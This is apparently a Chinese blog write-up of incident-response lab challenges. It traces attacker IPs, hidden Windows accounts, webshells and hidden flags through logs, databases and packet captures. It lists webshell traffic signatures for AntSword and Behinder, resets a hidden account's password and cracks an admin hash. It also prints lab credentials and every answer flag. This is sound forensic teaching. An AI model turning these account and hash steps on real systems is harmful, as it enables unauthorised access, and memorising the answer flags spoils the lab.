+<ol>
+<li><p>攻击者的两个IP地址</p>
+</li>
+<li><p>隐藏用户名称</p>
+</li>
+<li><p>黑客遗留下的flag【3个】</p>
+</li>
+</ol>
+<p>本虚拟机的考点不在隐藏用户以及ip地址，仔细找找把。</p>
+<p>相关账户密码：</p>
+<p>Windows:administrator&#x2F;xj@123456</p>
+<h3 id="攻击者的两个IP地址"><a href="#攻击者的两个IP地址" class="headerlink" title="攻击者的两个IP地址"></a>攻击者的两个IP地址</h3><p>第一个ip我们在事件查看器安全日志中筛选4624ID,进行有没有非法用户登录，以及查看非法用户的来源ip，也就是我们的攻击者ip</p>
+<p>事件日志命令：<code>eventvwr</code></p>
+<h4 id="非法用户命令：wmic-useraccount-get-format-list"><a href="#非法用户命令：wmic-useraccount-get-format-list" class="headerlink" title="非法用户命令：wmic useraccount  get * /format:list"></a>非法用户命令：<code>wmic useraccount  get * /format:list</code></h4><p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_1_hackUser.png" alt="image-20250429200809123"></p>
+<p>成功拿到隐藏用户：hack6618$</p>
+<p>筛选4624事件ID之后，使用查找hack6618$,可以直接定位到非法用户登录日志</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_1_ip1.png" alt="image-20250429201409496"></p>
+<p>成功拿到第一个ip:192.168.75.130</p>
+<p>第二个ip查找日志，但是在Administrator下日志全是空的，所以我们修改非法用户密码，进行非法用户账号登录</p>
+<p>命令：<code>net user hack6618$ 123456qwe@123</code></p>
+<p>登录非法用户进行日志查看，高并发访问网站的ip就是第二个攻击者ip</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_1_ip2.png" alt="image-20250429201917995"></p>
+<p>拿到第二个攻击者ip:192.168.75.129</p>
+<h3 id="隐藏用户名称-非法用户命令：wmic-useraccount-get-format-list"><a href="#隐藏用户名称-非法用户命令：wmic-useraccount-get-format-list" class="headerlink" title="[隐藏用户名称](# 非法用户命令：wmic useraccount  get * /format:list)"></a>[隐藏用户名称](# 非法用户命令：<code>wmic useraccount  get * /format:list</code>)</h3><h3 id="黑客留下的flag"><a href="#黑客留下的flag" class="headerlink" title="黑客留下的flag"></a>黑客留下的flag</h3><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>第一个flag在黑客留下的脚本执行当中，检查非法用户的下载行为</p>
+<p>一把梭：win10会把用户访问过的文件保存成快速访问，可以直接定位到systm.bat文件</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web3_3_QuickVisit.png" alt="image-20250429202825931"></p>
+<p>通过命令行可以查看脚本文件执行的输出</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_echoBat.png" alt="image-20250429203214266"></p>
+<p>拿到flag：</p>
+<p>flag{888666abc}</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>第二个flag在计划程序当中，命令：<code>taskschd.msc</code></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_taskschd.png" alt="image-20250429203646536"></p>
+<p>成功拿到第二个flag:</p>
+<p>flag{zgsfsys@sec}</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>第三个flag首先猜测在文件中，用dnGrep查找文件内容无果，只能猜测flag在网站之中</p>
+<p>用phpstudy打开网站，访问z-blog，但是没有账号密码</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_z-blogNoUserPassword.png" alt="image-20250429204601686"></p>
+<p>下面有两个方法可以拿到flag：</p>
+<ul>
+<li>使用z-blog密码恢复工具</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://bbs.zblogcn.com/thread-83419.html">Z-BlogPHP密码找回工具-程序发布-ZBlogger技术交流中心</a></p>
+<p>直接找回密码，发现有一个hack用户，点进去查看信息，个人描述里面就是flag</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_z-blogRecoveryPassword.png" alt="image-20250429205440733"></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_flag3.png" alt="image-20250429205557576"></p>
+<ul>
+<li>使用mysql数据库查询hack数据，也能拿到flag</li>
+</ul>
+<p>进入到D:\phpstudy_pro\Extensions\MySQL5.7.26\bin下，使用命令行登录</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_mysqlCommand.png" alt="image-20250429210049035"></p>
+<p>查看个人信息</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_hackInfo.png" alt="image-20250429210315418"></p>
+<p>拿到flag</p>
+<p>flag{H@Ck@sec}</p>
+<p>最后提交：</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/web_3_3_allAnswer.png" alt="image-20250429210625104"></p>
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="linux1"><a href="#linux1" class="headerlink" title="linux1"></a>linux1</h2><p>前言:小王急匆匆地找到小张，小王说”李哥，我dev服务器被黑了”,快救救我！！</p>
+<p>挑战内容：</p>
+<p>黑客的IP地址</p>
+<p>遗留下的三个flag</p>
+<p>相关账户密码：</p>
+<p>defend&#x2F;defend</p>
+<p>root&#x2F;defend</p>
+<h3 id="黑客的ip地址"><a href="#黑客的ip地址" class="headerlink" title="黑客的ip地址"></a>黑客的ip地址</h3><p>黑客登录会留下登录日志，直接查看&#x2F;var&#x2F;log&#x2F;secure</p>
+<p>一把梭命令（查看哪些主机爆破了多少次）：<code>grep &quot;Failed password for root&quot; /var/log/secure| awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr</code></p>
+<p>直接拿到黑客登录的ip地址</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_1_1_remainIP.png" alt="image-20250507211627192"></p>
+<h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>切换到root用户，查看history记录，每个用户的history是不同的，拿到flag</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_1_2_history.png" alt="image-20250507212006980"></p>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{thisismybaby}</p>
+</blockquote>
+<h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>上面他去rc.d&#x2F;rc.local，这是系统开机项配置文件，我们也去看看</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_1_2_rclocal.png" alt="image-20250507212316807"></p>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{kfcvme50}</p>
+</blockquote>
+<h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>回到我们的&#x2F;var&#x2F;log，发现有redis，查看一下登录情况</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linu_1_4_reidslog.png" alt="image-20250507213416490"></p>
+<p>发现黑客通过redis登录成功的，查看一下redis.conf（redis的配置文件）</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_1_4_redisconf.png" alt="image-20250507213655726"></p>
+<p>拿下最后一个flag</p>
+<blockquote>
+<p>flag{P@ssW0rd_redis}</p>
+</blockquote>
+<p>如果是打ctf的话，可以直接用在常用目录下一把梭命令：<code>grep -inr flag&#123; /etc</code></p>
+<p>最后提交</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_1_submitflag.png" alt="image-20250507213823559"></p>
+<h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>挑战内容</p>
+<p>前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！</p>
+<p>1,提交攻击者IP</p>
+<p>2,提交攻击者修改的管理员密码(明文)</p>
+<p>3,提交第一次Webshell的连接URL(<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xx/abcdefg?abcdefg%E5%8F%AA%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A4abcdefg?abcdefg">http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg</a>)</p>
+<p>3,提交Webshell连接密码</p>
+<p>4,提交数据包的flag1</p>
+<p>5,提交攻击者使用的后续上传的木马文件名称</p>
+<p>6,提交攻击者隐藏的flag2</p>
+<p>7,提交攻击者隐藏的flag3</p>
+<p>相关账户密码：</p>
+<p>root&#x2F;Inch@957821.</p>
+<p>这里官方给的账户密码登录不了，推荐使用<a target="_blank" rel="noopener" href="https://www.linuxidc.com/Linux/2014-10/107689.htm%EF%BC%88%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%89">https://www.linuxidc.com/Linux/2014-10/107689.htm（修改密码）</a></p>
+<h3 id="提交攻击者的ip"><a href="#提交攻击者的ip" class="headerlink" title="提交攻击者的ip"></a>提交攻击者的ip</h3><p>首先要了解各种集成面板的特征，&#x2F;www是宝塔面板的特征。直接输入命令bt</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_1_bt.png" alt="image-20250512154626305"></p>
+<p>因为不知道登录面板的命令，首先输入5修改面板密码，</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_1_modifyBTpasswd.png" alt="image-20250512155047651"></p>
+<p>接着输入3启动面板，输入14查看面板登录地址</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_1_BTlogin.png" alt="image-20250512155243499"></p>
+<p>首先添加域名，让我们可以通过内网域名访问服务器搭建起来的网站服务</p>
+<img src="2025/05/19/知攻善防WP/images/linux_2_1_BTaddDomain.png" alt="image-20250512155600913" style="zoom: 33%;" />
+
+<p>查看网站日志，统计访问IP</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_1_BTattackIP.png" alt="image-20250512155750436"></p>
+<p>这里可以看到192.168.20.1攻击了317次，直接锁定</p>
+<p>还有第二种解法，通过一把梭命令筛选访问日志</p>
+<p><code>awk &#39;&#123;print $1&#125;&#39; /www/wwwlogs/127.0.0.1.log | sort | uniq -c | sort -nr</code></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_1_logCommand.png" alt="image-20250512160622519"></p>
+<p>也可以拿到攻击者ip</p>
+<h3 id="提交攻击者修改的管理员密码（明文）"><a href="#提交攻击者修改的管理员密码（明文）" class="headerlink" title="提交攻击者修改的管理员密码（明文）"></a>提交攻击者修改的管理员密码（明文）</h3><p>这里的管理员密码是指网站的管理员密码，那我们直接登录数据库查看</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_2_mysqlLogin.png" alt="image-20250512161917531"></p>
+<p>切换到kaoshi数据库</p>
+<p><code>use kaoshi;</code></p>
+<p>查看有哪些表</p>
+<p><code>show tables;</code></p>
+<p>发现有users表</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_2_userTables.png" alt="image-20250512162138293"></p>
+<p>直接查看users表数据：<code>select * from x2_user\G</code></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_2_admin.png" alt="image-20250512162322647"></p>
+<p>这个peadmin一看就是管理员，密码一般都是md5加密的，推荐这个网站进行md5解密<a target="_blank" rel="noopener" href="https://toolshu.com/crackmd5">土薯在线工具</a></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_2_md5Decode.png" alt="image-20250512162529177"></p>
+<p>成功拿到md5解密密码：Network@2020</p>
+<p>第二种解法也可以使用（BT面板登录）phpmyadmin直接查看</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_2_phpmyadmin.png" alt="image-20250512163043744"></p>
+<h3 id="提交第一次webshell连接的URL-只用交参数"><a href="#提交第一次webshell连接的URL-只用交参数" class="headerlink" title="提交第一次webshell连接的URL(只用交参数)"></a>提交第一次webshell连接的URL(只用交参数)</h3><p>webshell特征：@eval</p>
+<p>直接一把梭命令查找webshell</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_3_webshellFeature.png" alt="image-20250512163323463"></p>
+<p>成功锁定两个URL:</p>
+<blockquote>
+<p>&#x2F;data&#x2F;html&#x2F;user&#x2F;tpls&#x2F;app&#x2F;register.html</p>
+<p>&#x2F;data&#x2F;html&#x2F;content&#x2F;tpls&#x2F;master&#x2F;blocks_modify.html</p>
+</blockquote>
+<p>登录管理员账户进行查看</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_3_webLogin.png" alt="image-20250512163906412"></p>
+<h4 id="第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面"><a href="#第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面" class="headerlink" title="第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面"></a>第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面</h4><img src="2025/05/19/知攻善防WP/images/linux_2_3_webshellHint.png" alt="image-20250512165317201"  />
+
+<p>直接查询日志，看攻击者ip的访问日志</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_3_webshellURL.png" alt="image-20250512170017544"></p>
+<p>成功拿到第一次webshell</p>
+<blockquote>
+<p>index.php?user-app-register</p>
+</blockquote>
+<h3 id="提交webshell的密码-第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面"><a href="#提交webshell的密码-第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面" class="headerlink" title="[提交webshell的密码](# 第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面)"></a>[提交webshell的密码](# 第一个URL打开发现就在注册协议的首部加上了webshell，第二个URL打开发现在标签位置写入了URL，并且给了提示是在注册协议的注册页面)</h3><p>Network2020</p>
+<h3 id="提交数据包的flag1"><a href="#提交数据包的flag1" class="headerlink" title="提交数据包的flag1"></a>提交数据包的flag1</h3><p>数据包就在&#x2F;root下，把数据包拖出来用wireshark分析，过滤http协议</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_5_wiresharkHTTP.png" alt="image-20250512170710485"></p>
+<p>直接就发现了flag，追踪流看一下找到flag</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_5_flag1.png" alt="image-20250512170904784"></p>
+<blockquote>
+<p>flag1{Network@_2020_Hack}</p>
+</blockquote>
+<h3 id="提交攻击者后续上传木马名称"><a href="#提交攻击者后续上传木马名称" class="headerlink" title="提交攻击者后续上传木马名称"></a>提交攻击者后续上传木马名称</h3><p>过滤一下POST请求，发现只有两个php文件，第一个是我们提交webshellURL,那第二个肯定是后续上传的木马了（有点预期解了），我们分析一下吧</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_6_wiresharkAnalysis.png" alt="image-20250512172108050"></p>
+<p>追踪第一个木马看一下</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_6_webshellAnalysisAnt.png" alt="image-20250512172309553"></p>
+<p>这个ini_set一眼就是蚁剑（不知道的，用蚁剑挂bp代理，中间抓包看一下）</p>
+<p>追踪第二个木马看一下</p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_6_webshellAnalysisBinder.png" alt="image-20250512173416853"></p>
+<p>这里是冰蝎的流量特征，这里说一下冰蝎的流量特征</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">建立连接后的cookie存在特征字符</span><br><span class="line">所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/</span><br><span class="line"></span><br><span class="line">冰蝎4</span><br><span class="line">Accept: application/json, text/javascript, /; q=0.01 </span><br><span class="line">Content-type: Application/x-www-form-urlencoded </span><br></pre></td></tr></table></figure>
+
+<p>木马文件是version2.php</p>
+<h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>一把梭命令：<code>grep -inr &#39;flag&#123;&#39; /www</code></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_7_flag2Command.png" alt="image-20250512174131694"></p>
+<p>拿到flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}</p>
+<h3 id="flag3-2"><a href="#flag3-2" class="headerlink" title="flag3"></a>flag3</h3><p>其实这个在history可以查到，但是也有一把梭命令</p>
+<p>一把梭命令：<code>grep -inr &#39;flag&#123;&#39; /etc</code></p>
+<p><img src="/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/images/linux_2_7_flag3Command.png" alt="image-20250512174320920"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">0xYyssh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/">http://example.com/2025/05/19/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">0xYyssh'Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/sword.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/05/19/CTFshow-web-WP/" title="CTFshow_web_WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CTFshow_web_WP</div></div><div class="info-2"><div class="info-item-1">个人对CTFshow_Web写的一些wp总结，不喜勿喷</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/sword.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">0xYyssh</div><div class="author-info-description">我要成为Web高手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0xYyssh"><i class="fab fa-github"></i><span>sponsor me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F1"><span class="toc-number">1.1.</span> <span class="toc-text">web渗透1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A6%81%E6%89%BE%E5%88%B0shell%E5%AF%86%E7%A0%81%EF%BC%8C%E9%82%A3%E6%88%91%E4%BB%AC%E9%A6%96%E5%85%88%E5%B0%B1%E8%A6%81%E6%89%BE%E5%88%B0shell%EF%BC%8C%E4%B8%A4%E7%A7%8D%E5%8A%9E%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">第一个要找到shell密码，那我们首先就要找到shell，两种办法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%A6%81%E6%89%BE%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84ip%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%BF%98%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%8C%E5%8F%91%E9%80%81shell-php%E7%9A%84ip%E6%98%AF192-168-126-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">第二个要找到攻击者的ip地址，还是日志分析，发送shell.php的ip是192.168.126.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E4%B8%AA%E8%A6%81%E6%89%BE%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%9C%89%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E4%B8%80%E6%8A%8A%E6%A2%AD%E6%98%AF%E7%9B%B4%E6%8E%A5%E6%95%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.3.</span> <span class="toc-text">第三个要找攻击者的隐藏用户名，这个有多种方式，一把梭是直接敲命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E4%B8%AA%E6%98%AF%E6%8B%BF%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E6%8C%96%E7%9F%BF%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">第四个是拿到攻击者挖矿的矿池域名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">1.2.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%A6%81%E6%89%BE%E6%94%BB%E5%87%BB%E8%80%85ip%EF%BC%8C%E4%BE%9D%E6%97%A7%E6%98%AF%E5%88%86%E6%9E%90%E6%97%A5%E5%BF%97"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.要找攻击者ip，依旧是分析日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E4%B8%80%E7%9B%B4%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AAphp%E6%96%87%E4%BB%B6%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9C%A8%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%89%BE%E5%88%B0system-php"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E4%BD%8D%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AF%86%E7%A0%81%E6%98%AFhack6618%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%98%AF%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%9C%A8%E9%A9%AC-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%84%9A%E6%9C%AC%E9%80%BB%E8%BE%91%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%E4%BE%9D%E6%97%A7%E6%98%AF%E5%91%BD%E4%BB%A4%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%9Awmic-useraccount-get-format-list"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">隐藏用户名依旧是命令一把梭：wmic useraccount get * &#x2F;format:list</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-webshell%E5%90%8D-%E6%89%BE%E5%88%B0%E4%B8%80%E7%9B%B4%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AAphp%E6%96%87%E4%BB%B6%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9C%A8%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%89%BE%E5%88%B0system-php"><span class="toc-number">1.2.2.</span> <span class="toc-text">[2.webshell名](# 找到一直访问一个php文件，猜测是木马文件，在网站根目录找到system.php)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-webshell%E5%AF%86%E7%A0%81-%E7%A1%AE%E8%AE%A4%E4%BD%8D%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AF%86%E7%A0%81%E6%98%AFhack6618%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%98%AF%E5%93%A5%E6%96%AF%E6%8B%89%E7%9A%84%E6%9C%A8%E9%A9%AC-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%84%9A%E6%9C%AC%E9%80%BB%E8%BE%91%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84"><span class="toc-number">1.2.3.</span> <span class="toc-text">[3.webshell密码](# 确认位木马文件，密码是hack6618，这个是哥斯拉的木马,可以看到脚本逻辑是一样的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9F%A5%E6%89%BE%E4%BC%AAQQ%E5%8F%B7"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.查找伪QQ号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6-%E4%BC%AA%E6%9C%8D%E5%8A%A1%E5%99%A8ip%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.5.</span> <span class="toc-text">5&#x2F;6.伪服务器ip的端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%88%86%E6%9E%90%E9%BB%91%E5%AE%A2%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5"><span class="toc-number">1.2.6.</span> <span class="toc-text">7.分析黑客如何入侵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%E4%BE%9D%E6%97%A7%E6%98%AF%E5%91%BD%E4%BB%A4%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%9Awmic-useraccount-get-format-list"><span class="toc-number">1.2.7.</span> <span class="toc-text">[8.查找隐藏用户名](# 隐藏用户名依旧是命令一把梭：wmic useraccount get * &#x2F;format:list)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web3"><span class="toc-number">1.3.</span> <span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E4%B8%A4%E4%B8%AAIP%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">攻击者的两个IP地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 